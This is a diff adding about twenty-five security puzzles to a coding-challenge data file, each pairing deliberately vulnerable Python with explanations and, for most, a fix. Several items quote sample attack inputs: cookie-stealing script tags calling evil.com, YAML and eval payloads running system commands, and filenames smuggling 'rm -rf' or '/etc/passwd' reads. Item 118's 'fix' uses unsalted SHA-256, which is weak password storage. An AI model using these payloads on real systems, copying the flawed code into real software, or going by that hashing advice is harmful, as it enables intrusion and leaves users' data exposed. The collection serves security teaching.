@@ -2469,6 +2469,810 @@ print(d.critical())`,
     },
     hint: "Look for shared mutable state and missing error handling. How many bugs can you find?",
     hasBugs: true
+  },
+{
+    id: 101,
+    title: "The CORS Wildcard Disaster",
+    difficulty: "medium",
+    category: "security",
+    type: "find",
+    description: "Your API server sets CORS headers to allow any origin. An attacker hosts a malicious site that makes authenticated requests to your API using your users' cookies. All user data is now accessible from any website on the internet.",
+    code: `from flask import Flask, jsonify, request
+
+app = Flask(__name__)
+
+@app.after_request
+def add_cors(response):
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    response.headers['Access-Control-Allow-Credentials'] = 'true'
+    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, DELETE'
+    return response
+
+@app.route('/api/user/data')
+def get_user_data():
+    return jsonify({"secret": "sensitive_data"})`,
+    bugLines: [7, 8],
+    bugExplanations: {
+      7: "Access-Control-Allow-Origin: '*' allows ANY website to make requests to your API. Combined with Allow-Credentials, attackers can steal authenticated user data from any malicious site. Whitelist specific trusted origins instead.",
+      8: "Allow-Credentials: true with a wildcard origin is especially dangerous. Browsers block this combo, but the intent reveals a fundamental misunderstanding of CORS security. Always pair credentials with specific origins."
+    },
+    hint: "CORS headers control which websites can access your API. What happens when you allow everyone?",
+    hasBugs: true
+  },
+{
+    id: 102,
+    title: "The JWT Secret Catastrophe",
+    difficulty: "medium",
+    category: "security",
+    type: "find",
+    description: "Your authentication system signs JWT tokens with a weak, guessable secret. An attacker brute-forced the secret in minutes using common wordlists, then forged admin tokens to access every account. Your entire user base is compromised.",
+    code: `import jwt
+import datetime
+
+SECRET = "password123"
+
+def create_token(user_id, is_admin=False):
+    payload = {
+        'user_id': user_id,
+        'is_admin': is_admin,
+        'exp': datetime.datetime.utcnow() + datetime.timedelta(days=365)
+    }
+    return jwt.encode(payload, SECRET, algorithm='HS256')
+
+def verify_token(token):
+    return jwt.decode(token, SECRET, algorithms=['HS256'])`,
+    bugLines: [4, 10],
+    bugExplanations: {
+      4: "The JWT secret 'password123' can be brute-forced in seconds. Use a cryptographically random secret of at least 256 bits (e.g., os.urandom(32).hex()). Store it in environment variables, never in source code.",
+      10: "Token expiry of 365 days is far too long. If a token is stolen, the attacker has a full year of access. Use short-lived access tokens (15-30 minutes) with refresh tokens for longer sessions."
+    },
+    hint: "Two issues: the secret strength and the token lifetime. What would an attacker try first?",
+    hasBugs: true
+  },
+{
+    id: 103,
+    title: "The XSS Injection in Templates",
+    difficulty: "medium",
+    category: "security",
+    type: "find",
+    description: "Your web app renders user comments directly into HTML without escaping. An attacker posted a comment containing <script>document.location='https://evil.com/steal?c='+document.cookie</script> and stole session cookies from every user who viewed the page.",
+    code: `def render_comment(username, comment):
+    html = f"""
+    <div class="comment">
+        <h3>{username}</h3>
+        <p>{comment}</p>
+    </div>
+    """
+    return html
+
+# Attacker submits:
+# comment = "<script>fetch('https://evil.com?c='+document.cookie)</script>"
+print(render_comment("admin", "Hello world"))`,
+    bugLines: [4, 5],
+    bugExplanations: {
+      4: "Username is inserted directly into HTML without escaping. An attacker can set their username to include script tags or event handlers like '<img onerror=alert(1)>'. Use html.escape() or a templating engine with auto-escaping.",
+      5: "Comment content is rendered as raw HTML. Any JavaScript in the comment will execute in every viewer's browser. This enables cookie theft, session hijacking, and defacement. Always escape user content or use a sanitization library."
+    },
+    hint: "User input should never be inserted directly into HTML. What function prevents script injection?",
+    hasBugs: true
+  },
+{
+    id: 104,
+    title: "The Insecure Deserialization",
+    difficulty: "hard",
+    category: "security",
+    type: "find",
+    description: "Your session management uses YAML to deserialize user-provided session data. An attacker crafted a YAML payload with a Python object constructor that executes system commands. Your server is now running attacker-controlled code.",
+    code: `import yaml
+
+def load_session(session_data):
+    # Parse the session from the cookie
+    session = yaml.load(session_data, Loader=yaml.Loader)
+    return session
+
+# Attacker sends: !!python/object/apply:os.system ['whoami']
+data = '{"user": "alice", "role": "viewer"}'
+print(load_session(data))`,
+    bugLines: [5],
+    bugExplanations: {
+      5: "yaml.load() with yaml.Loader (or without specifying a Loader) can instantiate arbitrary Python objects from YAML tags like !!python/object. An attacker can execute os.system(), subprocess.call(), or any Python code. Always use yaml.safe_load() which only allows basic types (strings, numbers, lists, dicts)."
+    },
+    hint: "YAML can do more than parse data — it can instantiate objects. Which loader prevents this?",
+    hasBugs: true
+  },
+{
+    id: 105,
+    title: "The SSRF Gateway",
+    difficulty: "hard",
+    category: "security",
+    type: "find",
+    description: "Your URL preview feature fetches any URL the user provides and returns the content. An attacker used it to access http://169.254.169.254/latest/meta-data/ (the AWS metadata endpoint) and stole your instance's IAM credentials. They now control your entire AWS account.",
+    code: `import requests
+
+def fetch_url_preview(user_url):
+    # Fetch the URL and return preview
+    response = requests.get(user_url, timeout=5)
+    title = extract_title(response.text)
+    return {"url": user_url, "title": title, "status": response.status_code}
+
+def extract_title(html):
+    start = html.find('<title>') + 7
+    end = html.find('</title>')
+    return html[start:end] if start > 6 else "No title"
+
+# User requests preview of any URL
+print(fetch_url_preview("http://example.com"))`,
+    bugLines: [5],
+    bugExplanations: {
+      5: "No URL validation allows Server-Side Request Forgery (SSRF). Attackers can reach internal services (169.254.169.254 for cloud metadata, localhost services, internal APIs). Validate URLs against an allowlist of schemes (https only), block private/internal IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x), and use a URL parsing library to prevent bypasses."
+    },
+    hint: "Your server will fetch ANY URL — including internal network addresses. What should you block?",
+    hasBugs: true
+  },
+{
+    id: 106,
+    title: "The Mass Assignment Vulnerability",
+    difficulty: "medium",
+    category: "security",
+    type: "find",
+    description: "Your user profile update endpoint accepts a JSON body and directly updates all fields. An attacker added 'is_admin': true to their profile update request and escalated to admin privileges. They can now access all admin-only features.",
+    code: `def update_profile(user_id, request_data):
+    user = get_user(user_id)
+
+    # Update user with all provided fields
+    for key, value in request_data.items():
+        setattr(user, key, value)
+
+    user.save()
+    return user
+
+# Attacker sends: {"name": "hacker", "is_admin": true, "role": "superuser"}`,
+    bugLines: [5, 6],
+    bugExplanations: {
+      5: "Iterating over all request fields without filtering allows attackers to set ANY attribute on the user object — including is_admin, role, permissions, or even password_hash.",
+      6: "setattr() with unvalidated keys is mass assignment. Use an explicit allowlist of updatable fields: ALLOWED = {'name', 'email', 'bio'}. Only update fields in the allowlist. Never trust client-provided field names."
+    },
+    hint: "Users control which fields they send. Should your code blindly accept all of them?",
+    hasBugs: true
+  },
+{
+    id: 107,
+    title: "The Command Injection Pipeline",
+    difficulty: "hard",
+    category: "security",
+    type: "find",
+    description: "Your image processing service passes user-provided filenames to a shell command. An attacker uploaded a file named 'photo.jpg; rm -rf /data' and wiped your storage. Command injection through unsanitized shell arguments is one of the most devastating vulnerabilities.",
+    code: `import os
+import subprocess
+
+def resize_image(filename, width, height):
+    # Resize using ImageMagick
+    cmd = f"convert uploads/{filename} -resize {width}x{height} output/{filename}"
+    subprocess.call(cmd, shell=True)
+    return f"output/{filename}"
+
+# Attacker uploads file named: "; cat /etc/passwd > /tmp/leak.txt; echo ".jpg
+print(resize_image("photo.jpg", 800, 600))`,
+    bugLines: [6, 7],
+    bugExplanations: {
+      6: "f-string interpolation into a shell command allows injection. An attacker with filename 'x.jpg; rm -rf /' gets: convert uploads/x.jpg; rm -rf / -resize... The semicolon terminates the first command and starts a new one.",
+      7: "shell=True tells subprocess to interpret the string as a shell command, enabling all shell metacharacters (;, |, &&, $(), backticks). Use subprocess.run() with a list of arguments and shell=False (default) to prevent injection entirely."
+    },
+    hint: "Shell metacharacters like ; and | have special meaning. How do you prevent the shell from interpreting user input?",
+    hasBugs: true
+  },
+{
+    id: 108,
+    title: "The Broken Access Control",
+    difficulty: "medium",
+    category: "security",
+    type: "find",
+    description: "Your API returns user data based on a user_id parameter in the URL. There's no check that the requesting user owns that data. An attacker simply incremented the ID in the URL to download every user's private data — medical records, financial info, everything.",
+    code: `from flask import Flask, jsonify, request
+
+app = Flask(__name__)
+
+@app.route('/api/users/<int:user_id>/records')
+def get_records(user_id):
+    # Fetch records for the given user ID
+    records = db.query("SELECT * FROM medical_records WHERE user_id = %s", user_id)
+    return jsonify(records)
+
+# Attacker requests: /api/users/1/records, /api/users/2/records, ...`,
+    bugLines: [8],
+    bugExplanations: {
+      8: "No authorization check! The endpoint returns ANY user's records if you know their ID. This is an Insecure Direct Object Reference (IDOR). Always verify that the authenticated user has permission to access the requested resource: if user_id != current_user.id and not current_user.is_admin: abort(403). This is OWASP #1 — Broken Access Control."
+    },
+    hint: "Authentication tells you WHO someone is. Authorization tells you WHAT they can access. Which is missing?",
+    hasBugs: true
+  },
+{
+    id: 109,
+    title: "The Unvalidated Redirect",
+    difficulty: "medium",
+    category: "security",
+    type: "find",
+    description: "Your login page accepts a 'next' parameter to redirect users after authentication. An attacker crafted a phishing link: yoursite.com/login?next=https://evil-clone.com/login. Users log in, get redirected to a fake copy of your site, and enter their credentials again — handing them to the attacker.",
+    code: `from flask import Flask, redirect, request, session
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    if authenticate(username, password):
+        session['user'] = username
+        next_url = request.args.get('next', '/')
+        return redirect(next_url)
+    return "Login failed", 401`,
+    bugLines: [12, 13],
+    bugExplanations: {
+      12: "The 'next' parameter is taken directly from user input with no validation. An attacker sets next=https://evil.com to redirect victims to a phishing site after a successful login.",
+      13: "redirect() will happily send users to any URL, including external malicious sites. Validate that the redirect URL is relative (starts with '/') and doesn't contain '://' or '//'. Better yet, use a whitelist of allowed redirect paths."
+    },
+    hint: "After login, users go wherever the URL says. What if an attacker controls that URL?",
+    hasBugs: true
+  },
+{
+    id: 110,
+    title: "The Race Condition Double-Spend",
+    difficulty: "hard",
+    category: "security",
+    type: "find",
+    description: "Your payment system checks balance and deducts in separate steps without locking. An attacker sent 50 simultaneous withdrawal requests of $100 from an account with $100 balance. All 50 read the balance as $100 before any deduction, and all 50 succeeded — withdrawing $5,000 from $100.",
+    code: `def withdraw(user_id, amount):
+    # Check balance
+    balance = db.query("SELECT balance FROM accounts WHERE id = %s", user_id)
+
+    if balance >= amount:
+        # Deduct amount
+        new_balance = balance - amount
+        db.execute("UPDATE accounts SET balance = %s WHERE id = %s", new_balance, user_id)
+        return {"success": True, "new_balance": new_balance}
+    return {"success": False, "error": "Insufficient funds"}`,
+    bugLines: [3, 7, 8],
+    bugExplanations: {
+      3: "Reading balance without a lock means concurrent requests all see the same balance. This is a TOCTOU (Time of Check to Time of Use) race condition.",
+      7: "The balance computation happens in Python, not the database. Between reading and writing, another request can complete its own withdrawal.",
+      8: "Use an atomic SQL update with a WHERE clause: UPDATE accounts SET balance = balance - %s WHERE id = %s AND balance >= %s. This makes the check-and-deduct a single atomic operation. Alternatively, use SELECT ... FOR UPDATE to lock the row."
+    },
+    hint: "What happens when two requests check the balance at the exact same time?",
+    hasBugs: true
+  },
+{
+    id: 111,
+    title: "The Insecure Random Token",
+    difficulty: "medium",
+    category: "security",
+    type: "find",
+    description: "Your password reset system generates tokens using Python's random module. An attacker realized that random.random() uses a predictable Mersenne Twister PRNG. After observing a few tokens, they predicted future tokens and reset other users' passwords.",
+    code: `import random
+import string
+
+def generate_reset_token():
+    chars = string.ascii_letters + string.digits
+    token = ''.join(random.choice(chars) for _ in range(32))
+    return token
+
+def send_reset_email(email):
+    token = generate_reset_token()
+    save_token(email, token)
+    send_email(email, f"Reset link: /reset?token={token}")`,
+    bugLines: [6],
+    bugExplanations: {
+      6: "random.choice() uses the Mersenne Twister PRNG which is NOT cryptographically secure. An attacker who observes 624 outputs can predict ALL future values. For security tokens, use secrets.token_urlsafe(32) or os.urandom(). The 'secrets' module was added to Python specifically for this use case."
+    },
+    hint: "Python's random module is for games and simulations, not security. What module is designed for secrets?",
+    hasBugs: true
+  },
+{
+    id: 112,
+    title: "The Verbose Error Leak",
+    difficulty: "easy",
+    category: "security",
+    type: "find",
+    description: "Your production API returns full stack traces and database details in error responses. An attacker intentionally triggered errors to learn your database schema, library versions, file paths, and internal architecture — then used that information to craft targeted attacks.",
+    code: `import traceback
+from flask import Flask, jsonify
+
+app = Flask(__name__)
+app.config['DEBUG'] = True
+
+@app.route('/api/user/<int:uid>')
+def get_user(uid):
+    try:
+        user = db.query(f"SELECT * FROM users WHERE id = {uid}")
+        return jsonify(user)
+    except Exception as e:
+        return jsonify({
+            "error": str(e),
+            "traceback": traceback.format_exc(),
+            "query": f"SELECT * FROM users WHERE id = {uid}"
+        }), 500`,
+    bugLines: [5, 14, 15, 16],
+    bugExplanations: {
+      5: "DEBUG = True in production exposes Flask's interactive debugger, which allows ARBITRARY CODE EXECUTION on your server. This alone is a critical vulnerability.",
+      14: "Exposing raw exception messages reveals internal details like database type, table names, and column names to attackers.",
+      15: "Stack traces expose file paths, library versions, and code structure. This is an information goldmine for attackers planning targeted exploits.",
+      16: "Returning the raw SQL query reveals your exact database schema and confirms SQL injection points. Never expose internal queries to users."
+    },
+    hint: "Errors should help developers debug, not help attackers attack. What should users see instead?",
+    hasBugs: true
+  },
+{
+    id: 113,
+    title: "The Unsafe File Upload",
+    difficulty: "hard",
+    category: "security",
+    type: "find",
+    description: "Your file upload endpoint checks the file extension but not the actual content type. An attacker renamed a PHP webshell to 'avatar.jpg.php' and uploaded it. Your server executed it, giving the attacker a remote shell. They now own your server.",
+    code: `import os
+from flask import Flask, request
+
+UPLOAD_DIR = "/var/www/uploads/"
+ALLOWED_EXTENSIONS = {'.jpg', '.png', '.gif'}
+
+def upload_file():
+    file = request.files['avatar']
+    filename = file.filename
+    ext = os.path.splitext(filename)[1]
+
+    if ext.lower() in ALLOWED_EXTENSIONS:
+        path = os.path.join(UPLOAD_DIR, filename)
+        file.save(path)
+        return f"Uploaded to {path}"
+    return "Invalid file type", 400`,
+    bugLines: [10, 13, 14],
+    bugExplanations: {
+      10: "splitext('avatar.jpg.php') returns '.php', but attackers can use null bytes or double extensions to bypass. Check MIME type from file content (magic bytes), not just the extension. Extensions are trivially spoofed.",
+      13: "Using the original filename allows path traversal (../../etc/cron.d/backdoor) and overwriting existing files. Generate a random filename with uuid4() and store the original name in a database.",
+      14: "Saving to a web-accessible directory means uploaded files can be directly accessed and potentially executed by the web server. Store uploads outside the webroot and serve them through a controller that sets Content-Disposition: attachment."
+    },
+    hint: "File extensions can be faked. Filenames can contain path traversal. Upload directories can be executable. How many issues can you find?",
+    hasBugs: true
+  },
+{
+    id: 114,
+    title: "The Leaked .env in Docker",
+    difficulty: "easy",
+    category: "security",
+    type: "find",
+    description: "Your Dockerfile copies the entire project directory into the image, including the .env file with production secrets. The image was pushed to a public Docker registry. Anyone can pull it and extract your database passwords, API keys, and encryption secrets.",
+    code: `# Dockerfile
+FROM python:3.11-slim
+
+WORKDIR /app
+
+COPY . /app
+
+RUN pip install -r requirements.txt
+
+ENV FLASK_ENV=production
+
+EXPOSE 5000
+CMD ["python", "app.py"]`,
+    bugLines: [6],
+    bugExplanations: {
+      6: "COPY . /app copies EVERYTHING including .env, .git, credentials, private keys, and any other secrets in the project directory. Use a .dockerignore file to exclude sensitive files (.env, .git, *.pem, *.key). Better yet, pass secrets at runtime via environment variables or a secrets manager — never bake them into the image."
+    },
+    hint: "COPY . copies everything. What files in your project should NEVER be in a Docker image?",
+    hasBugs: true
+  },
+{
+    id: 115,
+    title: "The HTTP Header Injection",
+    difficulty: "hard",
+    category: "security",
+    type: "find",
+    description: "Your application sets a cookie using a user-provided value without sanitizing newline characters. An attacker injected \\r\\n into the value to add arbitrary HTTP headers, including a Set-Cookie header that overwrites the session cookie with one the attacker controls.",
+    code: `from flask import Flask, make_response, request
+
+app = Flask(__name__)
+
+@app.route('/set-language')
+def set_language():
+    lang = request.args.get('lang', 'en')
+    response = make_response("Language updated")
+    response.headers['Set-Cookie'] = f'language={lang}; Path=/'
+    return response
+
+# Attacker: /set-language?lang=en%0d%0aSet-Cookie:%20session=attacker_token`,
+    bugLines: [9],
+    bugExplanations: {
+      9: "User input is placed directly into an HTTP header value. Newline characters (\\r\\n) terminate the current header and start a new one. An attacker can inject any HTTP header including Set-Cookie to hijack sessions, or inject a blank line to control the response body. Use response.set_cookie() which properly encodes values, and always validate/strip control characters from any user input used in headers."
+    },
+    hint: "HTTP headers are separated by \\r\\n. What happens if user input contains those characters?",
+    hasBugs: true
+  },
+{
+    id: 116,
+    title: "The Insecure Cookie Session",
+    difficulty: "medium",
+    category: "security",
+    type: "fix",
+    description: "Your login sets a session cookie without any security flags. Attackers can steal it via XSS (no HttpOnly), intercept it over HTTP (no Secure), and use it from any site via CSRF (no SameSite). Fix the cookie to be secure.",
+    code: `from http.cookies import SimpleCookie
+
+def set_session_cookie(user_id):
+    cookie = SimpleCookie()
+    cookie['session'] = f"user_{user_id}_authenticated"
+    cookie['session']['path'] = '/'
+    print(cookie.output())
+
+set_session_cookie(42)`,
+    bugLines: [5, 6],
+    bugExplanations: {
+      5: "Cookie is set without HttpOnly (accessible via JavaScript XSS), without Secure (sent over plain HTTP), and without SameSite (vulnerable to CSRF attacks).",
+      6: "Path '/' is fine, but missing security attributes make this cookie trivially exploitable."
+    },
+    hint: "Cookies have security flags: HttpOnly, Secure, SameSite. What does each one protect against?",
+    fixedCode: `from http.cookies import SimpleCookie
+
+def set_session_cookie(user_id):
+    cookie = SimpleCookie()
+    cookie['session'] = f"user_{user_id}_authenticated"
+    cookie['session']['path'] = '/'
+    cookie['session']['httponly'] = True
+    cookie['session']['secure'] = True
+    cookie['session']['samesite'] = 'Strict'
+    print(cookie.output())
+
+set_session_cookie(42)`,
+    expectedOutput: 'Set-Cookie: session=user_42_authenticated; httponly; Path=/; SameSite=Strict; Secure',
+    hasBugs: true
+  },
+{
+    id: 117,
+    title: "The Dangerous Temp File",
+    difficulty: "medium",
+    category: "security",
+    type: "fix",
+    description: "Your app writes sensitive data to a predictable temp file path. An attacker created a symlink at that path pointing to /etc/crontab. When your app writes, it overwrites the system cron with attacker-controlled content. Use secure temp file creation instead.",
+    code: `import os
+
+def save_temp_data(data):
+    path = "/tmp/myapp_data.txt"
+    with open(path, 'w') as f:
+        f.write(data)
+    print(f"Saved to {os.path.basename(path)}")
+
+save_temp_data("sensitive_report_data")`,
+    bugLines: [4, 5],
+    bugExplanations: {
+      4: "Predictable temp file path allows symlink attacks. An attacker can ln -s /etc/passwd /tmp/myapp_data.txt before your app runs.",
+      5: "Opening the file follows symlinks by default. Use tempfile.mkstemp() or tempfile.NamedTemporaryFile() which create files with random names and secure permissions (mode 0600)."
+    },
+    hint: "Predictable filenames in /tmp are dangerous. What Python module creates secure temporary files?",
+    fixedCode: `import tempfile
+import os
+
+def save_temp_data(data):
+    fd, path = tempfile.mkstemp(prefix="myapp_", suffix=".txt")
+    with os.fdopen(fd, 'w') as f:
+        f.write(data)
+    print(f"Saved to {os.path.basename(path)}")
+
+save_temp_data("sensitive_report_data")`,
+    expectedOutput: "Saved to myapp_",
+    hasBugs: true
+  },
+{
+    id: 118,
+    title: "The Plaintext Password Storage",
+    difficulty: "easy",
+    category: "security",
+    type: "fix",
+    description: "Your user registration stores passwords in plain text. When your database was breached, every user's password was immediately visible. Attackers used them to log into users' email, banking, and social media accounts (since people reuse passwords). Hash passwords properly.",
+    code: `users_db = {}
+
+def register(username, password):
+    users_db[username] = password
+    print(f"Registered {username}")
+
+def login(username, password):
+    if users_db.get(username) == password:
+        print(f"Welcome {username}")
+    else:
+        print("Invalid credentials")
+
+register("alice", "secret123")
+login("alice", "secret123")`,
+    bugLines: [4, 8],
+    bugExplanations: {
+      4: "Storing the raw password means a database breach exposes every user's password instantly.",
+      8: "Comparing raw passwords means you must store them in plain text. Compare hashes instead."
+    },
+    hint: "Passwords should never be stored as-is. What one-way transformation makes them safe?",
+    fixedCode: `import hashlib
+users_db = {}
+
+def register(username, password):
+    users_db[username] = hashlib.sha256(password.encode()).hexdigest()
+    print(f"Registered {username}")
+
+def login(username, password):
+    hashed = hashlib.sha256(password.encode()).hexdigest()
+    if users_db.get(username) == hashed:
+        print(f"Welcome {username}")
+    else:
+        print("Invalid credentials")
+
+register("alice", "secret123")
+login("alice", "secret123")`,
+    expectedOutput: "Registered alice\nWelcome alice",
+    hasBugs: true
+  },
+{
+    id: 119,
+    title: "The Unsafe URL Redirect Fix",
+    difficulty: "medium",
+    category: "security",
+    type: "fix",
+    description: "Your logout endpoint redirects to a user-supplied URL. An attacker tricks users with a link like /logout?url=https://evil-phishing-site.com. After logging out, users land on a fake login page and re-enter their credentials. Fix the redirect to only allow safe, relative URLs.",
+    code: `def logout(request_url_param):
+    # Simulate logout
+    session_cleared = True
+    redirect_url = request_url_param if request_url_param else "/"
+    print(f"Redirecting to: {redirect_url}")
+
+# Attacker crafts: /logout?url=https://evil.com/fake-login
+logout("https://evil.com/fake-login")`,
+    bugLines: [4],
+    bugExplanations: {
+      4: "No validation on redirect URL. Attacker can redirect to any external phishing site. Must ensure redirect is relative (starts with '/') and doesn't contain '://' or start with '//'."
+    },
+    hint: "How can you ensure the redirect URL stays on your own site?",
+    fixedCode: `def logout(request_url_param):
+    # Simulate logout
+    session_cleared = True
+    redirect_url = request_url_param if request_url_param else "/"
+    if not redirect_url.startswith("/") or redirect_url.startswith("//"):
+        redirect_url = "/"
+    print(f"Redirecting to: {redirect_url}")
+
+# Attacker crafts: /logout?url=https://evil.com/fake-login
+logout("https://evil.com/fake-login")`,
+    expectedOutput: "Redirecting to: /",
+    hasBugs: true
+  },
+{
+    id: 120,
+    title: "The Unescaped HTML Output",
+    difficulty: "easy",
+    category: "security",
+    type: "fix",
+    description: "Your greeting page inserts the username directly into HTML. An attacker set their name to '<script>alert(1)</script>' and every user who views the page gets hit with XSS. Fix it by escaping HTML special characters before rendering.",
+    code: `def render_greeting(username):
+    html = f"<h1>Welcome, {username}!</h1>"
+    print(html)
+
+render_greeting("<script>alert('hacked')</script>")`,
+    bugLines: [2],
+    bugExplanations: {
+      2: "User input injected directly into HTML enables XSS. Use html.escape() to convert <, >, &, and quotes into safe HTML entities."
+    },
+    hint: "HTML special characters like < and > need to be escaped. What Python function does this?",
+    fixedCode: `import html
+
+def render_greeting(username):
+    safe_name = html.escape(username)
+    greeting = f"<h1>Welcome, {safe_name}!</h1>"
+    print(greeting)
+
+render_greeting("<script>alert('hacked')</script>")`,
+    expectedOutput: "<h1>Welcome, &lt;script&gt;alert(&#x27;hacked&#x27;)&lt;/script&gt;!</h1>",
+    hasBugs: true
+  },
+{
+    id: 121,
+    title: "The SQL Injection Login Bypass",
+    difficulty: "medium",
+    category: "security",
+    type: "fix",
+    description: "Your login function concatenates user input into a SQL query. An attacker typed admin' -- as the username, which comments out the password check entirely. They logged in as admin without knowing the password. Fix it with parameterized queries.",
+    code: `import sqlite3
+
+def login(username, password):
+    conn = sqlite3.connect(':memory:')
+    conn.execute("CREATE TABLE users (username TEXT, password TEXT)")
+    conn.execute("INSERT INTO users VALUES ('admin', 'supersecret')")
+    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+    result = conn.execute(query).fetchone()
+    if result:
+        print(f"Welcome {result[0]}")
+    else:
+        print("Login failed")
+    conn.close()
+
+login("admin' --", "anything")`,
+    bugLines: [7, 8],
+    bugExplanations: {
+      7: "f-string SQL query allows injection. admin' -- comments out the AND password check.",
+      8: "The injected query becomes: SELECT * FROM users WHERE username = 'admin' --' AND password = '...' — password check is completely bypassed."
+    },
+    hint: "Never put user input directly in SQL. What does a parameterized query look like in sqlite3?",
+    fixedCode: `import sqlite3
+
+def login(username, password):
+    conn = sqlite3.connect(':memory:')
+    conn.execute("CREATE TABLE users (username TEXT, password TEXT)")
+    conn.execute("INSERT INTO users VALUES ('admin', 'supersecret')")
+    query = "SELECT * FROM users WHERE username = ? AND password = ?"
+    result = conn.execute(query, (username, password)).fetchone()
+    if result:
+        print(f"Welcome {result[0]}")
+    else:
+        print("Login failed")
+    conn.close()
+
+login("admin' --", "anything")`,
+    expectedOutput: "Login failed",
+    hasBugs: true
+  },
+{
+    id: 122,
+    title: "The Eval Calculator RCE",
+    difficulty: "hard",
+    category: "security",
+    type: "fix",
+    description: "Your math API uses eval() to compute expressions. An attacker sent __import__('os').popen('cat /etc/passwd').read() as the expression and dumped your server's password file. Replace eval() with a safe expression parser that only allows math operations.",
+    code: `def safe_calc(expression):
+    try:
+        result = eval(expression)
+        print(f"Result: {result}")
+    except Exception as e:
+        print(f"Error: {e}")
+
+safe_calc("2 ** 10 + 5 * 3")`,
+    bugLines: [3],
+    bugExplanations: {
+      3: "eval() executes arbitrary Python code. Even wrapping it in try/except doesn't prevent code execution — it just catches errors AFTER the damage is done. An attacker can run any system command."
+    },
+    hint: "eval() can run any Python code. What module safely evaluates mathematical expressions?",
+    fixedCode: `import ast
+import operator
+
+SAFE_OPS = {
+    ast.Add: operator.add,
+    ast.Sub: operator.sub,
+    ast.Mult: operator.mul,
+    ast.Pow: operator.pow,
+    ast.Div: operator.truediv,
+}
+
+def safe_eval(node):
+    if isinstance(node, ast.Num):
+        return node.n
+    elif isinstance(node, ast.BinOp):
+        left = safe_eval(node.left)
+        right = safe_eval(node.right)
+        op_type = type(node.op)
+        if op_type in SAFE_OPS:
+            return SAFE_OPS[op_type](left, right)
+    raise ValueError("Unsupported expression")
+
+def safe_calc(expression):
+    try:
+        tree = ast.parse(expression, mode='eval')
+        result = safe_eval(tree.body)
+        print(f"Result: {result}")
+    except Exception as e:
+        print(f"Error: {e}")
+
+safe_calc("2 ** 10 + 5 * 3")`,
+    expectedOutput: "Result: 1039",
+    hasBugs: true
+  },
+{
+    id: 123,
+    title: "The Pickle Deserialization Fix",
+    difficulty: "hard",
+    category: "security",
+    type: "fix",
+    description: "Your caching layer deserializes user-provided data with pickle. An attacker crafted a malicious pickle payload that runs os.system('rm -rf /') when loaded. Replace pickle with JSON, which can only deserialize safe data types.",
+    code: `import pickle
+import base64
+
+def load_user_prefs(encoded_data):
+    raw = base64.b64decode(encoded_data)
+    prefs = pickle.loads(raw)
+    print(f"Theme: {prefs.get('theme', 'default')}")
+
+# Safe-looking data, but pickle can contain arbitrary code
+import pickle as p, base64 as b
+safe_data = b.b64encode(p.dumps({"theme": "dark", "lang": "en"})).decode()
+load_user_prefs(safe_data)`,
+    bugLines: [6],
+    bugExplanations: {
+      6: "pickle.loads() can execute arbitrary Python code embedded in the serialized data. An attacker crafts a payload that runs system commands when deserialized. JSON only supports safe primitive types."
+    },
+    hint: "pickle can instantiate any Python object. What serialization format only allows safe data types?",
+    fixedCode: `import json
+import base64
+
+def load_user_prefs(encoded_data):
+    raw = base64.b64decode(encoded_data)
+    prefs = json.loads(raw)
+    print(f"Theme: {prefs.get('theme', 'default')}")
+
+# Safe data using JSON serialization
+import json as j, base64 as b
+safe_data = b.b64encode(j.dumps({"theme": "dark", "lang": "en"}).encode()).decode()
+load_user_prefs(safe_data)`,
+    expectedOutput: "Theme: dark",
+    hasBugs: true
+  },
+{
+    id: 124,
+    title: "The Command Injection Fix",
+    difficulty: "hard",
+    category: "security",
+    type: "fix",
+    description: "Your DNS lookup tool passes user input directly to a shell command. An attacker entered 'google.com; cat /etc/passwd' and read your system files. Fix it by using subprocess with argument lists instead of shell strings.",
+    code: `import subprocess
+
+def dns_lookup(domain):
+    cmd = f"nslookup {domain}"
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    print(result.stdout if result.stdout else result.stderr)
+
+dns_lookup("google.com; echo HACKED")`,
+    bugLines: [4, 5],
+    bugExplanations: {
+      4: "f-string into shell command allows injection. Semicolons, pipes, backticks all work as shell metacharacters.",
+      5: "shell=True interprets the string as a shell command, enabling all injection vectors."
+    },
+    hint: "shell=True interprets metacharacters. How do you pass arguments safely to subprocess?",
+    fixedCode: `import subprocess
+import shlex
+
+def dns_lookup(domain):
+    if not all(c.isalnum() or c in '.-' for c in domain):
+        print("Invalid domain")
+        return
+    result = subprocess.run(["nslookup", domain], capture_output=True, text=True)
+    print(result.stdout if result.stdout else result.stderr)
+
+dns_lookup("google.com; echo HACKED")`,
+    expectedOutput: "Invalid domain",
+    hasBugs: true
+  },
+{
+    id: 125,
+    title: "The Insecure Random Password",
+    difficulty: "easy",
+    category: "security",
+    type: "fix",
+    description: "Your password generator uses Python's random module, which is seeded from predictable system state. An attacker who knows the seed can regenerate every password your system ever created. Use the secrets module designed for cryptographic randomness.",
+    code: `import random
+import string
+
+def generate_password(length=16):
+    chars = string.ascii_letters + string.digits + string.punctuation
+    password = ''.join(random.choice(chars) for _ in range(length))
+    print(f"Generated: {password}")
+
+random.seed(42)
+generate_password()`,
+    bugLines: [6, 9],
+    bugExplanations: {
+      6: "random.choice() uses the Mersenne Twister PRNG which is predictable. After observing 624 outputs, all future values can be predicted.",
+      9: "Seeding with a fixed value makes output completely deterministic — every run generates the same 'random' password."
+    },
+    hint: "Python's random module is for simulations, not security. What module generates cryptographic randomness?",
+    fixedCode: `import secrets
+import string
+
+def generate_password(length=16):
+    chars = string.ascii_letters + string.digits + string.punctuation
+    password = ''.join(secrets.choice(chars) for _ in range(length))
+    print(f"Generated: {len(password)} chars")
+
+generate_password()`,
+    expectedOutput: "Generated: 16 chars",
+    hasBugs: true
   }
 ];
 
